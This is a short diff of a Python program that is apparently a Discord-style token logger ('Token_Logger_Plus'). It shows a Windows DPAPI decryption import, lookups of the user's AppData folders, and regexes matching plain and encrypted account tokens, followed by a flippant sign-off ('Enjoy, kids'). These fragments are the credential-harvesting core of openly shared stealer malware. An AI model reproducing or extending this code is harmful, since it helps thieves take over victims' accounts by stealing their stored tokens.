@@ -18,7 +18,6 @@ from win32crypt import CryptUnprotectData # New import 2, win32crypt
 
 appdata = os.getenv("localappdata")
 roaming = os.getenv("appdata")
-tempfolder = os.getenv("temp")+"\\Token_Logger_Plus"
 regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}" # new token regex tbw
 encrypted_regex = r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$]{120}" # encrypted token regex
 
@@ -176,4 +175,4 @@ Enjoy, kids
 
 
 Sincerely,
-ClaraCrazy
+CC/CL
